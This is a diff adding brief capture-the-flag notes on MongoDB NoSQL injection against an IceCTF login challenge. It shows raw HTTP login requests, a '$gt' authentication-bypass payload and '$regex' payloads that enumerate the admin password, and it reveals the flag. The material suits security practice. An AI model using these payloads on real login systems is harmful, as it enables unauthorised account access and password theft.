@@ -1,0 +1,46 @@
+# MongoDB NoSQL Injection
+
+POST /login HTTP/1.1
+Host: chainedin.vuln.icec.tf
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Content-Type: application/json;charset=utf-8
+Referer: http://chainedin.vuln.icec.tf/login
+Content-Length: 39
+Cookie: _ga=GA1.2.1966816640.1439645169; __cfduid=dd1cf7daa33b32471a22b8bcd24a5b3091471021467
+Connection: close
+
+{"user":"agent1568","pass":"agent1568"}
+--
+POST /login HTTP/1.1
+Host: chainedin.vuln.icec.tf
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Content-Type: application/json;charset=utf-8
+Referer: http://chainedin.vuln.icec.tf/login
+Content-Length: 36
+Cookie: _ga=GA1.2.1966816640.1439645169; __cfduid=dd1cf7daa33b32471a22b8bcd24a5b3091471021467
+Connection: close
+
+{"user":"admin","pass": {"$gt": ""}}
+--
+{"user":"agent1568","pass": {"$regex": ".{10}"} }
+{"message":"Invalid Credentials"}
+
+{"user":"agent1568","pass": {"$regex": ".{9}"} }
+{"message":"Welcome back Agent 1568!"}
+--
+{"user":"admin","pass": {"$regex": ".{55}"} }
+{"user":"admin","pass": {"$regex": "Ic.{53}"} }
+--
+# Enumeration using Burp Intruder:
+{"user":"admin","pass": {"$regex": "IceCTF{I_t§§.{43}"} }
+{"user":"admin","pass": {"$regex": "IceCTF{I_thOugHT_YOu§§.{33}"} }
+{"user":"admin","pass": {"$regex": "IceCTF{I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monG§§.{0}"} }
+{"user":"admin","pass": {"$regex": "IceCTF{I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo}"} }
